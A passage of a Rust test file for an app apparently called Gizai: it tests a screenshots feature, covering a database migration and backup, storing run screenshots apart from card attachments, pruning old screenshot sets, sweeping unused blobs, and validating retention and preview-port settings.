//! GA-182 QA: the core of Screenshots. Migration 0019 on a database the previous version left; a run's screenshots on
//! its card (`files::insert_evidence`), kept out of the card's Attachments; the card's sets for its Screenshots tab
//! (`screenshots::sets`) and one screenshot's bytes (`shot`, `bytes`); the clearing of old sets (`prune`,
//! `housekeeping::clear_screenshots`) and of blobs no row uses (`sweep_blobs`); Settings → Agents and runs →
//! Screenshots, the project's and the card's switches, and the agent's Take screenshots switch.
use std::path::Path;

use gizai_core::db::{self, Db};
use gizai_core::housekeeping::{self, Cleared};
use gizai_core::mcp_servers::{self as m, AgentServer, AgentTools, CliTools};
use gizai_core::model::*;
use gizai_core::screenshots::{self as shots, Limits, ProjectScreenshots, Pruned, ShotSize};
use gizai_core::{files, ids, projects, seed, tasks, team};
use rusqlite::Connection;
use rusqlite_migration::{M, Migrations};
use sha2::{Digest, Sha256};

const DAY: i64 = 24 * 60 * 60 * 1000;

// ---- set-up ----

struct Board {
    db: Db,
    you: String,
    org: String,
    team: String,
    project: String,
    /// A frontend agent: the one whose runs keep screenshots.
    agent: String,
    /// Gizai's data folder: the blob store is its files/.
    data: tempfile::TempDir,
}

fn board() -> Board {
    let db = Db::open_in_memory().unwrap();
    let s = seed::ensure_seed(&db, "Jeffrey").unwrap();
    let project = projects::create(&db, &s.you_id, ProjectInput { name: "Kade".into(), key: "KADE".into(), ..Default::default() }).unwrap();
    let agent = team::add_agent(&db, &s.you_id, &s.team_id, AgentInput { name: "Frontend".into(), role_key: "frontend".into(),
        ..Default::default() }).unwrap();
    Board { db, you: s.you_id, org: s.org_id, team: s.team_id, project, agent, data: tempfile::tempdir().unwrap() }
}

impl Board {
    fn data(&self) -> &Path {
        self.data.path()
    }

    fn card(&self, title: &str) -> String {
        tasks::create(&self.db, &self.you, TaskInput { project_id: self.project.clone(), title: title.into(), ..Default::default() }).unwrap()
    }

    /// A run of the frontend agent on `task`, made at `created` (ms), with plain SQL: ended half a second later unless it
    /// is still running.
    fn run(&self, task: &str, created: i64, status: &str, outcome: Option<&str>, head: Option<&str>) -> String {
        let id = ids::new_id();
        let ended = (status != "running").then_some(created + 500);
        self.db.write(None, |w| {
            w.conn().execute(
                "INSERT INTO runs (id, created_at, updated_at, org_id, agent_actor_id, task_id, trigger, role_key, outcome, adapter, status,
                                   log_path, started_at, ended_at, head_sha)
                 VALUES (?1, ?2, ?2, ?3, ?4, ?5, 'routed', 'frontend', ?6, 'claude_code', ?7, '/tmp/run.jsonl', ?2, ?8, ?9)",
                rusqlite::params![id, created, self.org, self.agent, task, outcome, status, ended, head])?;
            Ok(())
        }).unwrap();
        id
    }

    /// A run's screenshot `name` with `bytes`, kept on `task` as the run's end does (`store_bytes`, `insert_evidence`).
    fn shot(&self, task: &str, run: &str, name: &str, bytes: &[u8]) -> FileRow {
        self.shot_as(task, run, name, bytes, "image/png", 1280, 800)
    }

    #[allow(clippy::too_many_arguments)]
    fn shot_as(&self, task: &str, run: &str, name: &str, bytes: &[u8], mime: &str, width: u32, height: u32) -> FileRow {
        let blob = files::store_bytes(self.data(), name, bytes).unwrap();
        let caption = format!("Caption of {name}");
        let e = files::Evidence { run_id: run, caption: &caption, mime, width, height };
        self.db.write(Some(self.agent.as_str()), |w| files::insert_evidence(w, &self.agent, task, &blob, &e)).unwrap()
    }

    /// What a person attached to `owner` (a card): a file `name` with `bytes`, added from a path.
    fn attach(&self, task: &str, name: &str, bytes: &[u8]) -> FileRow {
        let src = tempfile::tempdir().unwrap();
        let path = src.path().join(name);
        std::fs::write(&path, bytes).unwrap();
        files::add_from_path(&self.db, &self.you, self.data(), "task", task, &path).unwrap()
    }

    /// The card is in `category` ('done', 'cancelled') since `at`: completed then (Done only) and last changed then.
    fn finished(&self, task: &str, category: &str, at: i64) {
        self.db.write(None, |w| {
            w.conn().execute("UPDATE tasks SET state_category = ?2, completed_at = CASE WHEN ?2 = 'done' THEN ?3 END, updated_at = ?3 WHERE id = ?1",
                             rusqlite::params![task, category, at])?;
            Ok(())
        }).unwrap();
    }

    /// How many files rows (live or removed) the runs have.
    fn run_files(&self, runs: &[&String]) -> i64 {
        runs.iter().map(|r| self.db.read(|c| Ok(c.query_row("SELECT count(*) FROM files WHERE run_id = ?1", [r], |x| x.get::<_, i64>(0))?)).unwrap()).sum()
    }
}

fn sha_of(bytes: &[u8]) -> String {
    format!("{:x}", Sha256::digest(bytes))
}

fn set_ids(sets: &[shots::ScreenshotSet]) -> Vec<String> {
    sets.iter().map(|s| s.run_id.clone()).collect()
}

/// Sets a blob's modified time to `ms` (blobs are read-only: a read handle may still change its times, as the owner).
#[cfg(unix)]
fn age(path: &Path, ms: i64) {
    use std::time::{Duration, UNIX_EPOCH};
    std::fs::File::open(path).unwrap().set_modified(UNIX_EPOCH + Duration::from_millis(ms as u64)).unwrap();
}

// ---- 1. migration 0019 ----

/// Migrations 0001..0018 on a new file at `path`: a genuine schema 18 database, as v0.12.0 leaves it, with an org, a
/// person and an attachment in it.
fn v18_db(path: &Path) {
    let all = [
        include_str!("../../migrations/0001_init.sql"), include_str!("../../migrations/0002_agents.sql"), include_str!("../../migrations/0003_chat.sql"),
        include_str!("../../migrations/0004_effort.sql"), include_str!("../../migrations/0005_pull_requests.sql"),
        include_str!("../../migrations/0006_worktree_prepare.sql"), include_str!("../../migrations/0007_card_flow.sql"),
        include_str!("../../migrations/0008_board_check.sql"), include_str!("../../migrations/0009_agent_folders.sql"),
        include_str!("../../migrations/0010_run_refusals.sql"), include_str!("../../migrations/0011_column_agents.sql"),
        include_str!("../../migrations/0012_chat_runs_on.sql"), include_str!("../../migrations/0013_bitbucket.sql"),
        include_str!("../../migrations/0014_memory.sql"), include_str!("../../migrations/0015_lead_merges.sql"),
        include_str!("../../migrations/0016_memory_groups.sql"), include_str!("../../migrations/0017_pending_actions.sql"),
        include_str!("../../migrations/0018_indexes.sql"),
    ];
    let mut c = Connection::open(path).unwrap();
    c.pragma_update(None, "foreign_keys", "OFF").unwrap();
    Migrations::new(all.iter().map(|sql| M::up(sql)).collect()).to_latest(&mut c).unwrap();
    c.pragma_update(None, "foreign_keys", "ON").unwrap();
    c.execute_batch("INSERT INTO orgs (id, created_at, updated_at, name, key) VALUES ('org', 1, 1, 'Yotech', 'YT');
        INSERT INTO actors (id, created_at, updated_at, org_id, kind, name, handle, status) VALUES ('you', 1, 1, 'org', 'person', 'Jeffrey', 'jeffrey', 'active');
        INSERT INTO files (id, created_at, updated_at, org_id, owner_type, owner_id, name, mime, size_bytes, sha256, uploaded_by_actor_id)
          VALUES ('f1', 1, 1, 'org', 'task', 't1', 'brief.pdf', 'application/pdf', 5, 'abc', 'you');").unwrap();
    assert_eq!(c.query_row("PRAGMA user_version", [], |r| r.get::<_, i64>(0)).unwrap(), 18, "schema 18");
}

/// (name, type) of each column of `table`.
fn columns(c: &Connection, table: &str) -> Vec<(String, String)> {
    c.prepare(&format!("SELECT name, type FROM pragma_table_info('{table}')")).unwrap()
        .query_map([], |r| Ok((r.get(0)?, r.get(1)?))).unwrap().map(Result::unwrap).collect()
}

#[test]
fn a_schema_18_database_opens_with_0019s_columns_and_index_and_keeps_its_rows() {
    let dir = tempfile::tempdir().unwrap();
    let path = dir.path().join("gizai.db");
    v18_db(&path);
    let db = Db::open(&path).unwrap();
    db.read(|c| {
        assert_eq!(c.query_row("PRAGMA user_version", [], |r| r.get::<_, i64>(0))?, 21, "0019 ran (and GA-212's 0020 and GA-228's 0021 after it)");
        for (table, col, ty) in [("files", "caption", "TEXT"), ("files", "width", "INTEGER"), ("files", "height", "INTEGER"),
                                 ("runs", "screenshots_note", "TEXT"), ("tasks", "screenshots", "INTEGER"),
                                 ("projects", "screenshots_json", "TEXT"), ("projects", "preview_command", "TEXT"),
                                 ("projects", "preview_start_secs", "INTEGER")] {
            assert!(columns(c, table).contains(&(col.to_string(), ty.to_string())), "{table}.{col} {ty}: {:?}", columns(c, table));
        }
        let (on, sql): (String, String) = c.query_row("SELECT tbl_name, sql FROM sqlite_master WHERE type = 'index' AND name = 'files_run'", [],
                                                      |r| Ok((r.get(0)?, r.get(1)?)))?;
        let cols: Vec<String> = c.prepare("SELECT name FROM pragma_index_info('files_run') ORDER BY seqno")?
            .query_map([], |r| r.get(0))?.collect::<rusqlite::Result<_>>()?;
        assert_eq!((on.as_str(), cols), ("files", vec!["run_id".to_string()]));
        assert!(sql.ends_with("WHERE run_id IS NOT NULL"), "only run files are in it: {sql}");
        // the attachment the old version kept is still there, with no run, caption or size
        let row: (String, Option<String>, Option<String>, Option<i64>, Option<i64>) = c.query_row(
            "SELECT name, run_id, caption, width, height FROM files WHERE id = 'f1'", [], |r| Ok((r.get(0)?, r.get(1)?, r.get(2)?, r.get(3)?, r.get(4)?)))?;
        assert_eq!(row, ("brief.pdf".to_string(), None, None, None, None));
        Ok(())
    }).unwrap();
    assert_eq!(files::list(&db, "task", "t1").unwrap().len(), 1, "an attachment from before is still on its card");
    // and opening it again changes nothing
    drop(db);
    let db = Db::open(&path).unwrap();
    assert_eq!(db.read(|c| Ok(c.query_row("PRAGMA user_version", [], |r| r.get::<_, i64>(0))?)).unwrap(), 21);
}

/// `SCHEMA_VERSION` (db.rs) names the schema the migrations give: `changes.schema_version` records it for every write, and
/// `Db::open` backs a database up when it is below it.
#[test]
fn schema_version_names_the_schema_the_migrations_give() {
    let db = Db::open_in_memory().unwrap();
    let v = db.read(|c| Ok(c.query_row("PRAGMA user_version", [], |r| r.get::<_, i64>(0))?)).unwrap();
    assert_eq!(v, 21, "0001..0021");
    assert_eq!(db::SCHEMA_VERSION, v, "db::SCHEMA_VERSION is raised to 21 with GA-228's migration 0021");
}

/// `Db::open` copies a database to backups/ before upgrading it (when its version is below `SCHEMA_VERSION`): a v0.12.0
/// user's schema 18 database is backed up before 0019's ALTER TABLEs change it.
#[test]
fn a_schema_18_database_is_backed_up_before_0019_changes_it() {
    let dir = tempfile::tempdir().unwrap();
    let path = dir.path().join("gizai.db");
    v18_db(&path);
    let _db = Db::open(&path).unwrap();
    let snaps: Vec<String> = std::fs::read_dir(dir.path().join("backups")).map(|d| {
        d.map(|e| e.unwrap().file_name().to_string_lossy().into_owned()).collect()
    }).unwrap_or_default();
    assert_eq!(snaps.len(), 1, "one backup of the schema 18 database, taken before 0019 (and GA-212's 0020 and GA-228's 0021) upgraded it: {snaps:?}");
    assert!(snaps[0].starts_with("gizai-before-v21-"), "{snaps:?}");
}

// ---- 2. insert_evidence ----

#[test]
fn a_runs_screenshot_is_kept_on_its_card_with_its_run_agent_caption_and_size_and_attachments_leave_it_out() {
    let b = board();
    let t = b.card("Board");
    let r = b.run(&t, 1_000, "succeeded", Some("ready_for_testing"), None);
    let blob = files::store_bytes(b.data(), "01-board-desktop.png", b"\x89PNG one").unwrap();
    assert_eq!((blob.name.as_str(), blob.size_bytes, blob.sha256.clone()), ("01-board-desktop.png", 8, sha_of(b"\x89PNG one")));
    assert!(files::blob_path(b.data(), &blob.sha256).exists());
    let e = files::Evidence { run_id: &r, caption: "The board, desktop", mime: "image/webp", width: 1280, height: 800 };
    let f = b.db.write(Some(b.agent.as_str()), |w| files::insert_evidence(w, &b.agent, &t, &blob, &e)).unwrap();
    assert_eq!((f.name.as_str(), f.mime.as_deref(), f.size_bytes, f.sha256.as_str()), ("01-board-desktop.png", Some("image/webp"), 8, blob.sha256.as_str()));

    type Row = (String, String, Option<String>, Option<String>, Option<String>, Option<String>, Option<i64>, Option<i64>, Option<String>);
    let row: Row = b.db.read(|c| Ok(c.query_row(
        "SELECT owner_type, owner_id, run_id, created_by, uploaded_by_actor_id, caption, width, height, mime FROM files WHERE id = ?1", [&f.id],
        |r| Ok((r.get(0)?, r.get(1)?, r.get(2)?, r.get(3)?, r.get(4)?, r.get(5)?, r.get(6)?, r.get(7)?, r.get(8)?)))?)).unwrap();
    assert_eq!(row, ("task".into(), t.clone(), Some(r.clone()), Some(b.agent.clone()), Some(b.agent.clone()), Some("The board, desktop".into()),
                     Some(1280), Some(800), Some("image/webp".into())));

    // a person's attachment is listed; the run's screenshot is not
    let a = b.attach(&t, "brief.pdf", b"%PDF brief");
    let listed: Vec<String> = files::list(&b.db, "task", &t).unwrap().into_iter().map(|f| f.id).collect();
    assert_eq!(listed, [a.id.clone()]);
    // one stored with files::insert is an attachment too
    let other = files::store_bytes(b.data(), "notes.txt", b"notes").unwrap();
    let n = b.db.write(Some(b.you.as_str()), |w| files::insert(w, Some(b.you.as_str()), "task", &t, &other)).unwrap();
    let mut listed: Vec<String> = files::list(&b.db, "task", &t).unwrap().into_iter().map(|f| f.id).collect();
    listed.sort();
    let mut want = vec![a.id, n.id];
    want.sort();
    assert_eq!(listed, want, "both attachments, never the screenshot");
    // the screenshot is still a file of the card (files::get), only not an attachment
    assert_eq!(files::get(&b.db, &f.id).unwrap().name, "01-board-desktop.png");
}

// ---- 3. sets ----

#[test]
fn a_cards_sets_are_its_ended_runs_with_the_section_newest_first_with_commit_note_and_shots_by_name() {
    let b = board();
    let t = b.card("Board");
    let other = b.card("Another card");

    let r1 = b.run(&t, 1_000, "succeeded", Some("ready_for_testing"), Some("aaa1111"));
    shots::begin(&b.db, &r1).unwrap();
    // kept out of name order, so the set's order is the names'
    let s2 = b.shot_as(&t, &r1, "02-board-mobile.png", b"mobile picture", "image/png", 390, 844);
    let s1 = b.shot_as(&t, &r1, "01-board-desktop.png", b"desktop picture!", "image/jpeg", 1280, 800);

    // got the section, saved none, had no preview and left two files out
    let r2 = b.run(&t, 2_000, "failed", Some("no_result"), Some("bbb2222"));
    shots::begin(&b.db, &r2).unwrap();
    let left_out = vec!["13-board.png: over the limit of 12 a run".to_string(), "notes.txt: not a PNG, JPEG or WebP image".to_string()];
    shots::set_left_out(&b.db, &r2, &left_out).unwrap();
    shots::set_preview_why(&b.db, &r2, "It didn't answer on port 47130 in 120 s").unwrap();

    // no section: no set (and changing its note does nothing)
    let r3 = b.run(&t, 3_000, "succeeded", Some("ready_for_testing"), Some("ccc3333"));
    shots::set_left_out(&b.db, &r3, &left_out).unwrap();
    shots::set_preview_why(&b.db, &r3, "never").unwrap();
    assert_eq!(shots::run_note(&b.db, &r3).unwrap(), None);
    // still at work: no set yet
    let r4 = b.run(&t, 4_000, "running", None, None);
    shots::begin(&b.db, &r4).unwrap();
    b.shot(&t, &r4, "01-early.png", b"early");
    // another card's set
    let r5 = b.run(&other, 5_000, "succeeded", None, None);
    shots::begin(&b.db, &r5).unwrap();
    b.shot(&other, &r5, "01-other.png", b"other");

    let sets = shots::sets(&b.db, &t).unwrap();
    assert_eq!(set_ids(&sets), [r2.clone(), r1.clone()], "newest first; no run without the section, none still running, none of another card");

    let s = &sets[0];
    assert_eq!((s.agent_id.as_str(), s.agent_name.as_str(), s.role.as_deref(), s.status.as_str(), s.ended_at, s.commit.as_deref()),
               (b.agent.as_str(), "Frontend", Some("frontend"), "failed", 2_500, Some("bbb2222")));
    assert_eq!(s.outcome, None, "no_result reads as no result");
    assert!(s.shots.is_empty(), "a run that saved none still has its set");
    assert_eq!(s.left_out, left_out);
    assert_eq!(s.preview.as_deref(), Some("It didn't answer on port 47130 in 120 s"));

    let s = &sets[1];
    assert_eq!((s.status.as_str(), s.outcome.as_deref(), s.commit.as_deref(), s.ended_at), ("succeeded", Some("ready_for_testing"), Some("aaa1111"), 1_500));
    assert!(s.left_out.is_empty() && s.preview.is_none());
    let got: Vec<(String, String, String, i64, i64, i64, String)> = s.shots.iter()
        .map(|x| (x.file_id.clone(), x.name.clone(), x.caption.clone(), x.width, x.height, x.size_bytes, x.sha256.clone())).collect();
    assert_eq!(got, [
        (s1.id.clone(), "01-board-desktop.png".into(), "Caption of 01-board-desktop.png".into(), 1280, 800, 16, sha_of(b"desktop picture!")),
        (s2.id.clone(), "02-board-mobile.png".into(), "Caption of 02-board-mobile.png".into(), 390, 844, 14, sha_of(b"mobile picture")),
    ]);

    // the note as read back
    assert_eq!(shots::run_note(&b.db, &r2).unwrap(), Some(shots::RunNote { left_out: left_out.clone(),
        preview: Some("It didn't answer on port 47130 in 120 s".into()), preview_pid: None }));
    assert!(shots::run_note(&b.db, "no-such-run").is_err());
    assert!(shots::begin(&b.db, "no-such-run").is_err(), "a run that isn't there is refused");

    // a removed screenshot leaves its set
    files::remove(&b.db, &b.you, &s1.id).unwrap();
    let names: Vec<String> = shots::sets(&b.db, &t).unwrap()[1].shots.iter().map(|x| x.name.clone()).collect();
    assert_eq!(names, ["02-board-mobile.png"]);
    // the running run's set shows once it ended
    b.db.write(None, |w| { w.conn().execute("UPDATE runs SET status = 'succeeded', ended_at = 4600 WHERE id = ?1", [&r4])?; Ok(()) }).unwrap();
    assert_eq!(set_ids(&shots::sets(&b.db, &t).unwrap()), [r4, r2, r1]);
}

// ---- 4. shot and bytes ----

#[test]
fn a_screenshots_bytes_come_back_as_stored_and_any_other_file_is_refused() {
    let b = board();
    let t = b.card("Board");
    let r = b.run(&t, 1_000, "succeeded", None, None);
    shots::begin(&b.db, &r).unwrap();
    let picture: Vec<u8> = (0..=255u8).cycle().take(70_000).collect();
    let s = b.shot(&t, &r, "01-board.png", &picture);
    assert_eq!(shots::shot(&b.db, &s.id).unwrap().sha256, sha_of(&picture));
    assert_eq!(shots::bytes(&b.db, b.data(), &s.id).unwrap(), picture);

    // an attachment, even a PNG, is not a screenshot
    let a = b.attach(&t, "mockup.png", b"\x89PNG a mockup");
    assert_eq!(files::get(&b.db, &a.id).unwrap().mime.as_deref(), Some("image/png"));
    let err = shots::shot(&b.db, &a.id).unwrap_err().to_string();
    assert!(err.contains("isn't a run's screenshot"), "{err}");
    assert!(shots::bytes(&b.db, b.data(), &a.id).is_err());
    // an id nothing has
    assert!(shots::shot(&b.db, "no-such-file").is_err());
    assert!(shots::bytes(&b.db, b.data(), "no-such-file").is_err());
    // a run's file that isn't a PNG, JPEG or WebP
    let log = b.shot_as(&t, &r, "trace.txt", b"a trace", "text/plain", 0, 0);
    assert!(shots::bytes(&b.db, b.data(), &log.id).is_err());
    // a removed screenshot
    files::remove(&b.db, &b.you, &s.id).unwrap();
    assert!(shots::bytes(&b.db, b.data(), &s.id).is_err());
}

// ---- 5. prune ----

#[test]
fn each_card_keeps_its_newest_sets_with_pictures_and_never_its_attachments() {
    let b = board();
    let now = ids::now_ms();
    let t = b.card("Busy card");
    let brief = b.attach(&t, "brief.txt", b"brief");
    let mut runs = vec![];
    for i in 0..5 {
        let r = b.run(&t, 1_000 + i * 1_000, "succeeded", Some("ready_for_testing"), None);
        shots::begin(&b.db, &r).unwrap();
        b.shot(&t, &r, &format!("01-board-{i}.png"), format!("picture {i}").as_bytes());
        runs.push(r);
    }
    assert_eq!(shots::prune(&b.db, now, 3, 30).unwrap(), Pruned { sets: 2, files: 2 });
    assert_eq!(set_ids(&shots::sets(&b.db, &t).unwrap()), [runs[4].clone(), runs[3].clone(), runs[2].clone()], "the newest three");
    for r in &runs[..2] {
        assert_eq!(shots::run_note(&b.db, r).unwrap(), None, "its note went");
    }
    assert_eq!(b.run_files(&[&runs[0], &runs[1]]), 0, "its screenshots' rows went");
    assert_eq!(b.run_files(&[&runs[2], &runs[3], &runs[4]]), 3);
    assert_eq!(files::list(&b.db, "task", &t).unwrap().into_iter().map(|f| f.id).collect::<Vec<_>>(), [brief.id.clone()]);
    assert_eq!(shots::prune(&b.db, now, 3, 30).unwrap(), Pruned::default(), "a second prune has nothing to do");

    // a newer set without pictures doesn't count as one of the kept: with Keep 1, the newest with pictures stays
    let empty = b.run(&t, 9_000, "succeeded", None, None);
    shots::begin(&b.db, &empty).unwrap();
    assert_eq!(shots::prune(&b.db, now, 1, 30).unwrap(), Pruned { sets: 2, files: 2 });
    assert_eq!(set_ids(&shots::sets(&b.db, &t).unwrap()), [empty, runs[4].clone()]);
    assert_eq!(files::list(&b.db, "task", &t).unwrap().len(), 1, "the attachment stays");
}

#[test]
fn a_card_finished_longer_than_keep_days_loses_all_its_sets_unless_keep_days_is_0() {
    let b = board();
    let now = ids::now_ms();
    let make = |title: &str, sets: usize| {
        let t = b.card(title);
        let a = b.attach(&t, &format!("{title}.txt"), title.as_bytes());
        let mut rs = vec![];
        for i in 0..sets {
            let r = b.run(&t, 1_000 + i as i64 * 1_000, "succeeded", None, None);
            shots::begin(&b.db, &r).unwrap();
            b.shot(&t, &r, "01-board.png", format!("{title} {i}").as_bytes());
            rs.push(r);
        }
        (t, a, rs)
    };
    let (old_done, old_done_file, old_done_runs) = make("Done long ago", 2);
    // a set without pictures on it goes too
    let note_only = b.run(&old_done, 500, "succeeded", None, None);
    shots::begin(&b.db, &note_only).unwrap();
    b.finished(&old_done, "done", now - 40 * DAY);
    let (old_cancelled, old_cancelled_file, _) = make("Cancelled long ago", 1);
    b.finished(&old_cancelled, "cancelled", now - 31 * DAY);
    let (young_done, young_done_file, _) = make("Done lately", 1);
    b.finished(&young_done, "done", now - 10 * DAY);
    let (open, open_file, _) = make("Open", 2);

    // 0 keeps them all
    assert_eq!(shots::prune(&b.db, now, 3, 0).unwrap(), Pruned::default());
    assert_eq!(shots::sets(&b.db, &old_done).unwrap().len(), 3);

    assert_eq!(shots::prune(&b.db, now, 3, 30).unwrap(), Pruned { sets: 4, files: 3 });
    assert!(shots::sets(&b.db, &old_done).unwrap().is_empty());
    assert_eq!(b.run_files(&old_done_runs.iter().collect::<Vec<_>>()), 0);
    assert!(shots::sets(&b.db, &old_cancelled).unwrap().is_empty(), "Cancelled counts as finished, from its last change");
    assert_eq!(shots::sets(&b.db, &young_done).unwrap().len(), 1, "done 10 days ago, kept for 30");
    assert_eq!(shots::sets(&b.db, &open).unwrap().len(), 2, "an open card keeps its newest sets");
    for (t, f) in [(&old_done, &old_done_file), (&old_cancelled, &old_cancelled_file), (&young_done, &young_done_file), (&open, &open_file)] {
        assert_eq!(files::list(&b.db, "task", t).unwrap().into_iter().map(|f| f.id).collect::<Vec<_>>(), [f.id.clone()], "attachments stay");
    }
}

#[test]
fn clear_screenshots_follows_the_saved_settings() {
    let b = board();
    let now = ids::now_ms();
    let t = b.card("Board");
    let mut runs = vec![];
    for i in 0..3 {
        let r = b.run(&t, 1_000 + i * 1_000, "succeeded", None, None);
        shots::begin(&b.db, &r).unwrap();
        b.shot(&t, &r, "01-board.png", format!("picture {i}").as_bytes());
        runs.push(r);
    }
    // defaults: Keep 3, so nothing goes (and the blobs are young)
    assert_eq!(housekeeping::clear_screenshots(&b.db, b.data(), now).unwrap(), Cleared::default());
    shots::save_limits(&b.db, &Limits { keep_sets: 1, ..Limits::default() }, 1).unwrap();
    assert_eq!(housekeeping::clear_screenshots(&b.db, b.data(), now).unwrap(), Cleared { sets: 2, screenshots: 2, blobs: 0 });
    assert_eq!(set_ids(&shots::sets(&b.db, &t).unwrap()), [runs[2].clone()]);
}

// ---- 6. sweep_blobs ----

#[cfg(unix)]
#[test]
fn the_sweep_deletes_only_old_blobs_no_row_uses() {
    let b = board();
    let now = ids::now_ms();
    let old = now - 2 * DAY;
    assert_eq!(shots::sweep_blobs(&b.db, b.data(), now).unwrap(), 0, "no files/ folder yet: nothing to do");
    let t = b.card("Board");
    let r = b.run(&t, 1_000, "succeeded", None, None);
    shots::begin(&b.db, &r).unwrap();

    let orphan = files::store_bytes(b.data(), "orphan.png", b"nobody uses me").unwrap();
    let young = files::store_bytes(b.data(), "young.png", b"stored a moment ago").unwrap();
    let attachment = b.attach(&t, "brief.txt", b"an attachment");
    let removed = b.attach(&t, "old.txt", b"a removed attachment");
    files::remove(&b.db, &b.you, &removed.id).unwrap();
    let screenshot = b.shot(&t, &r, "01-board.png", b"a screenshot");
    // not a blob's name: never touched
    let stray = b.data().join("files").join(&orphan.sha256[..2]).join("notes.txt");
    std::fs::write(&stray, "mine").unwrap();
    for sha in [&orphan.sha256, &attachment.sha256, &removed.sha256, &screenshot.sha256] {
        age(&files::blob_path(b.data(), sha), old);
    }
    age(&stray, old);

    assert_eq!(shots::sweep_blobs(&b.db, b.data(), now).unwrap(), 1);
    assert!(!files::blob_path(b.data(), &orphan.sha256).exists(), "old and unused: gone");
    for (what, sha) in [("an attachment's", &attachment.sha256), ("a removed attachment's", &removed.sha256),
                        ("a screenshot's", &screenshot.sha256), ("a young one", &young.sha256)] {
        assert!(files::blob_path(b.data(), sha).exists(), "{what} blob stays");
    }
    assert!(stray.exists(), "a file that isn't a blob stays");
    assert_eq!(shots::bytes(&b.db, b.data(), &screenshot.id).unwrap(), b"a screenshot");
    assert_eq!(shots::sweep_blobs(&b.db, b.data(), now).unwrap(), 0, "a second sweep has nothing to do");

    // an old unused blob that is stored again (the same content) is young again, so a row about to be written keeps it
    let again = files::store_bytes(b.data(), "again.png", b"stored twice").unwrap();
    age(&files::blob_path(b.data(), &again.sha256), old);
    files::store_bytes(b.data(), "again.png", b"stored twice").unwrap();
    assert_eq!(shots::sweep_blobs(&b.db, b.data(), now).unwrap(), 0);
    assert!(files::blob_path(b.data(), &again.sha256).exists());
}

#[cfg(unix)]
#[test]
fn after_a_set_is_cleared_its_blob_goes_but_one_an_attachment_shares_stays() {
    let b = board();
    let now = ids::now_ms();
    let t = b.card("Done long ago");
    let r = b.run(&t, 1_000, "succeeded", None, None);
    shots::begin(&b.db, &r).unwrap();
    let only = b.shot(&t, &r, "01-only.png", b"only in a screenshot");
    let shared = b.shot(&t, &r, "02-shared.png", b"the same as the mockup");
    let other = b.card("Another card");
    let mockup = b.attach(&other, "mockup.png", b"the same as the mockup");
    assert_eq!(mockup.sha256, shared.sha256, "one blob for both");
    b.finished(&t, "done", now - 40 * DAY);
    for sha in [&only.sha256, &shared.sha256] {
        age(&files::blob_path(b.data(), sha), now - 2 * DAY);
    }

    assert_eq!(housekeeping::clear_screenshots(&b.db, b.data(), now).unwrap(), Cleared { sets: 1, screenshots: 2, blobs: 1 });
    assert!(shots::sets(&b.db, &t).unwrap().is_empty());
    assert!(!files::blob_path(b.data(), &only.sha256).exists(), "no row uses it any more");
    assert!(files::blob_path(b.data(), &shared.sha256).exists(), "the attachment still uses it");
    assert_eq!(std::fs::read(files::blob_path(b.data(), &mockup.sha256)).unwrap(), b"the same as the mockup");
    assert_eq!(files::list(&b.db, "task", &other).unwrap().len(), 1);
    assert!(shots::bytes(&b.db, b.data(), &shared.id).is_err(), "the cleared screenshot is no longer shown");
}

// ---- 7. settings ----

#[test]
fn screenshot_settings_have_their_defaults_ranges_and_messages_and_are_saved() {
    let d = Limits::default();
    assert_eq!((d.per_run, d.max_mb, d.keep_sets, d.keep_days, d.port_from, d.port_to), (12, 10, 3, 30, 47100, 47999));
    assert_eq!(d.max_bytes(), 10 * 1024 * 1024);
    let b = board();
    assert_eq!(shots::limits(&b.db), d, "nothing saved: the defaults");

    let refused = |l: Limits, at_once: u32| shots::check_limits(&l, at_once).unwrap_err();
    let per_run = "Screenshots per run must be from 1 to 30.";
    let max_mb = "Largest screenshot must be from 1 to 50 MB.";
    let keep_sets = "Keep per card must be from 1 to 20 sets.";
    let keep_days = "Delete a finished card's screenshots after must be from 0 to 365 days.";
    let ports = "Preview ports must be from 1024 to 65535.";
    assert_eq!(refused(Limits { per_run: 0, ..d }, 1), per_run);
    assert_eq!(refused(Limits { per_run: 31, ..d }, 1), per_run);
    assert_eq!(refused(Limits { max_mb: 0, ..d }, 1), max_mb);
    assert_eq!(refused(Limits { max_mb: 51, ..d }, 1), max_mb);
    assert_eq!(refused(Limits { keep_sets: 0, ..d }, 1), keep_sets);
    assert_eq!(refused(Limits { keep_sets: 21, ..d }, 1), keep_sets);
    assert_eq!(refused(Limits { keep_days: 366, ..d }, 1), keep_days);
    assert_eq!(refused(Limits { port_from: 1023, ..d }, 1), ports);
    assert_eq!(refused(Limits { port_to: 65536, ..d }, 1), ports);
    assert_eq!(refused(Limits { port_from: 48000, port_to: 47100, ..d }, 1),
               "Preview ports must go from the lower port to the higher one, not from 48000 to 47100.");
    assert_eq!(refused(Limits { port_from: 47100, port_to: 47109, ..d }, 2),
               "Preview ports must hold at least ten ports for each run at once: 47100 to 47109 has room for 1 run, and Runs at once \
(Settings → Runs) is 2.");
    assert!(shots::check_limits(&Limits { port_from: 47100, port_to: 47109, ..d }, 1).is_ok(), "ten ports for one run");
    // the edges
    for l in [Limits { per_run: 1, max_mb: 1, keep_sets: 1, keep_days: 0, port_from: 1024, port_to: 65535 },
              Limits { per_run: 30, max_mb: 50, keep_sets: 20, keep_days: 365, port_from: 1024, port_to: 65535 }] {
        assert_eq!(shots::check_limits(&l, 1), Ok(()), "{l:?}");
    }
    assert_eq!(shots::check_limits(&d, 90), Ok(()), "47100–47999 holds 90 runs");
    assert!(shots::check_limits(&d, 91).is_err());

    // saved, then read back
    let saved = Limits { per_run: 30, max_mb: 50, keep_sets: 20, keep_days: 0, port_from: 50000, port_to: 50099 };
    shots::save_limits(&b.db, &saved, 10).unwrap();
    assert_eq!(shots::limits(&b.db), saved);
    // a refused save changes nothing
    let err = shots::save_limits(&b.db, &Limits { per_run: 31, ..saved }, 1).unwrap_err().to_string();
    assert_eq!(err, per_run);
    assert!(shots::save_limits(&b.db, &saved, 11).is_err(), "100 ports hold ten runs, not eleven");
    assert_eq!(shots::limits(&b.db), saved);
    // a value outside its range saved some other way reads as its default
    gizai_core::settings::set(&b.db, "screenshots_per_run", &99u32).unwrap();
    gizai_core::settings::set(&b.db, "preview_port_from", &60000u32).unwrap();
    let l = shots::limits(&b.db);
    assert_eq!((l.per_run, l.port_from, l.port_to), (12, 47100, 47999), "ports the wrong way round: both defaults");
}

#[test]
fn a_projects_screenshots_have_their_defaults_and_sizes_and_start_time_their_ranges() {
    let d = ProjectScreenshots::default();
    assert!(d.on && !d.both_themes && !d.full_page);
